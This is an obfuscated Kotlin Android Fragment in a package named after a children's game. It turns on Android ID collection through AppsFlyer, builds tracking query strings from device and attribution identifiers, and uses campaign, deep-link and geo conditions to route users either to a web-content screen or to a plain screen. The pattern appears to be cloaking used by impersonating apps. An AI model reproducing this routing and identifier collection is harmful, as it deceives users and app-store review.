package com.tocaboca.tocalifeworldp.ncjxijvhud
import org.koin.android.ext.android.inject
import com.appsflyer.AppsFlyerLib
import com.tocaboca.tocalifeworldp.R
import org.koin.core.qualifier.named
import androidx.fragment.app.Fragment
import android.content.Context
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.rplepleplplskodkookx
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.vbopopn
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.hidij
import android.view.ViewGroup
import android.content.Intent
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.splalpplx
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.uhchuv
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.tooeiioiosaiod
import android.view.LayoutInflater
import android.view.View
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.hchxyd
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.rokokkocox
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.qpplaplxko
import android.content.SharedPreferences
import android.os.Build
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.uhxchuvhuhuchuudfh
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.woowpslokxc

import com.tocaboca.tocalifeworldp.wqqws.Iwetwwiosad
import com.tocaboca.tocalifeworldp.srwysuhd.Vozoozioixjhcddf
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.spalsokxkocoks

import android.os.Bundle
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.eopkoowk
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.ixjcjiijzjs


import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.rple
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.nnvcjbjjvuiffghugfhu
import com.tocaboca.tocalifeworldp.ncjxijvhud.Mkxooicsdsdf.oxocvidisif



class Tieowkwwsad : Fragment() {
    val asokokosjix: SharedPreferences by inject(named("SharedPreferences"))
    private lateinit var cjuvji: Context

    override fun onAttach(context: Context) {
        super.onAttach(context)
        cjuvji = context
    }

    override fun onStart() {
        super.onStart()
        val wokwolpslpdlpokx = asokokosjix.getString(oxocvidisif, null)
        val delpslp = asokokosjix.getString(hchxyd, null)
        val pzxlcpls = Build.VERSION.RELEASE
        val gkokvo = "com.tocaboca.tocalifeworldp"
        val sygdwjis = asokokosjix.getString(rplepleplplskodkookx, null)
        val qpqqllpqlpqokoskjixc: String? = asokokosjix.getString(uhchuv, null)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        val xikckokoxc = asokokosjix.getString(ixjcjiijzjs, null)
        val sjidwij = asokokosjix.getString("deepSt", null)
        val jxjjncs = asokokosjix.getString("appCamp", null)

        val tijijreko = Intent(activity, Vozoozioixjhcddf::class.java)
        val oxkkocokjihuvc = asokokosjix.getString("mainId", null)
        val dkoe = Intent(activity, Iwetwwiosad::class.java)
        val wiwookkosodix = asokokosjix.getString(rokokkocox, null)

        val nncjnvij = AppsFlyerLib.getInstance().getAppsFlyerUID(cjuvji)
        asokokosjix.edit().putString(splalpplx, nncjnvij).apply()

        val hhyccuuhx = "$wiwookkosodix$eopkoowk$jxjjncs&$uhxchuvhuhuchuudfh$nncjnvij&$nnvcjbjjvuiffghugfhu$oxkkocokjihuvc&$tooeiioiosaiod$gkokvo&$spalsokxkocoks$pzxlcpls&$qpplaplxko$woowpslokxc"
        val wqo = "$wiwookkosodix$uhxchuvhuhuchuudfh$wokwolpslpdlpokx&$nnvcjbjjvuiffghugfhu$qpqqllpqlpqokoskjixc&$tooeiioiosaiod$gkokvo&$spalsokxkocoks$pzxlcpls&$qpplaplxko$woowpslokxc"
        val kckmmkovkobji = "$wiwookkosodix$eopkoowk$sjidwij&$uhxchuvhuhuchuudfh$nncjnvij&$nnvcjbjjvuiffghugfhu$oxkkocokjihuvc&$tooeiioiosaiod$gkokvo&$spalsokxkocoks$pzxlcpls&$qpplaplxko$hidij"
        val ewokks = "$wiwookkosodix$eopkoowk$sjidwij&$uhxchuvhuhuchuudfh$wokwolpslpdlpokx&$nnvcjbjjvuiffghugfhu$qpqqllpqlpqokoskjixc&$tooeiioiosaiod$gkokvo&$spalsokxkocoks$pzxlcpls&$qpplaplxko$hidij"

        when(sygdwjis) {
            "1" ->
                if(jxjjncs!!.contains(rple)) {
                    asokokosjix.edit().putString(vbopopn, hhyccuuhx).apply()
                    asokokosjix.edit().putString("WebInt", "campaign").apply()
                    startActivity(tijijreko)
                    activity?.finish()
                } else if (sjidwij!=null||delpslp!!.contains(xikckokoxc.toString())) {
                    asokokosjix.edit().putString(vbopopn, kckmmkovkobji).apply()
                    asokokosjix.edit().putString("WebInt", "deepLink").apply()
                    startActivity(tijijreko)
                    activity?.finish()
                } else {
                    startActivity(dkoe)
                    activity?.finish()
                }
            "0" ->
                if(sjidwij!=null) {
                    asokokosjix.edit().putString(vbopopn, ewokks).apply()
                    asokokosjix.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(tijijreko)
                    activity?.finish()
                } else if (delpslp!!.contains(xikckokoxc.toString())) {
                    asokokosjix.edit().putString(vbopopn, wqo).apply()
                    asokokosjix.edit().putString("WebInt", "geo").apply()
                    startActivity(tijijreko)
                    activity?.finish()
                } else {
                    startActivity(dkoe)
                    activity?.finish()
                }
        }
    }


    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.owkosijxjiz, container, false)
    }

}
